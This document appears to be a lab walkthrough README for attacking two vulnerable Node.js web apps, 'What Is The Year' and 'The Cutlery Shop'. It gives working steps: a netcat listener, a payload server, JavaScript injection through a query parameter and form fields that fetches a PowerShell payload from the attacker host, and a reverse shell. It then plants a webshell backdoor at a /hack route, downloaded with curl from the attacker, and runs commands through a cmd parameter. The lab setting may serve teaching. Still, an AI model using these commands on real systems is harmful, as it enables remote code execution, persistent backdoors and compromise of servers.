<h1 align="center">1 Initial Stage</h2>

## 1.1 Start a netcat listener
Before performing the attack, the hacker machine must host a web server. Which will listen for [reverse tcp](https://www.acunetix.com/blog/web-security-zone/what-is-reverse-shell/) connections, the following example uses [openbsd-netcat](https://man.openbsd.org/nc.1).
```
nc -lvnp 8000
```

## 1.2 Start a payload server
Since [inject.js](./inject.js) will retrieve a second stage payload from the hacker machine we have to make that file available to the victim.
```
cd payload/Windows
python -m http.server 5000
```

## 1.3 Customise payload details
Open command prompt and find out the local IPv4 address of your hacker machine.
```
ip addr
```
Open [inject.js](./inject.js) and modify it according to the IPv4 address of your hacker machine.
```
# inject.js
... DownloadString("http://<hacker-ip>:5000/payload.ps1") ...
```

## 1.4 Injecting payload into "What Is The Year" web app
### Method 1 - Copy Paste
Copy the contents of the [inject.js](./inject.js) file.
```
type payload/inject.js | clip
```
And paste the contents of [inject.js](inject.js) into the `year` HTTP GET Query
```
curl -G --data-urlencode "year=<payload>" http://<victim-ip>:3000
```
### Method 2 - Server/Client
We utilise cURL to inject the payload to the victim web server
```
curl -G --data-urlencode "year=$(curl -s http://<hacker-ip>:5000/inject.js)" http://<victim-ip>:3000
```

## 1.5 Injecting payload into "The Cutlery Shop" web app
Using the form fields of the application, you can perform a string escape on the `Name` field, and inject the contents of [inject.js](./inject.js) there.

![string-escape](../../images/string-escape.png)

Alternatively, you can simply paste [inject.js](./inject.js) into the `Price` field, since it does not take a string input.

![direct-inject](../../images/direct-inject.png)

## 1.6 Result
If successful, the hacker machine will receive a socket output similar to what is shown below:
```
% nc -lnvp 8000
Listening on 0.0.0.0 8000
Connection received on 127.0.0.1 44598
$ ls
README.md
app.js
node_modules
package-lock.json
package.json
public
views
```

<h1 align="center">2 Persistence Stage</h2>

## 2.2 Webshell Backdoor
The reverse shell provides us the privilege of the compromised user, but it is a temporary foothold in the system. To gain persistence, we can introduce a webshell as a secondary entry into the system.

The [wity-webshell.js](./wity-webshell.js) and [tcs-webshell.js](./tcs-webshell.js) files contains a snippet of code prepared in advance, which adds a webshell to the NodeJS application. You must use the appropriate webshell file matching the name of the web app you are running.

__Note:__ `tcs` = The Cutlery Shop, `wity` = What Is The Year

## 2.3 Creating Webshell File
It is slightly inconvenient to create text files with very specific contents from a primitive reverse shell. Here are some of the techniques that I use to create malicious files on the server.

### Method 1 - Cat Command
Using the `cat` linux command create a file on the victim's server, by manually typing or pasting the contents of webshell file, excluding the `...` like so:
```
(victim) $ cat > webshell.js <<EOF
... PASTE PAYLOAD HERE ...
EOF
```
__Note:__ Typing `EOF` will end the command make sure to paste the code before typing `EOF` at the end.

### Method 2 - File Download
Host a web server from `payload/Webshells` directory
```
(hacker) $ cd payload
(hacker) $ php -S 0.0.0.0:5000
```
Then use the reverse shell to download it on the victim's machine.  
```
(victim) $ curl -O http://<hacker-ip>:5000/webshell.js
```

__Note:__ `hacker` is a local terminal session and `victim` is the netcat reverse shell

## 2.4 Editing Files In Powershell
The most important file in both web applications is the `app.js` file. Because it contains all the routes to the frontend pages, but in a real scenario, files of interests may vary. 

[AFAIK](https://www.urbandictionary.com/define.php?term=afaik), there are no easy ways to edit text files straight from powershell. Even if you have access to a reverse shell and install editors like [vim](https://www.vim.org/) or [nano](https://www.nano-editor.org/) on the victim machine. Due to the nature of this hack, terminal text editors will not function properly

Which leaves you with only one easy option, which is to edit the file locally:
### Step 1 - Get app.js
```
cat app.js
```

## 2.5 Using The Backdoor

The payload will spawn a webshell which you can access from the `/hack` route in `http://<victim-ip>:3000`. Commands can be executed by appending them in front of the `cmd` HTTP GET Query.

Using the cURL program
```
curl -G --data-urlencode "cmd=<command>" http://<victim-ip>:3000/hack
```

Using a web browser
```
http://<victim-ip>:3000/hack?cmd=<command>
```

### Result
![webshell-screenshot](../../images/webshell.png)
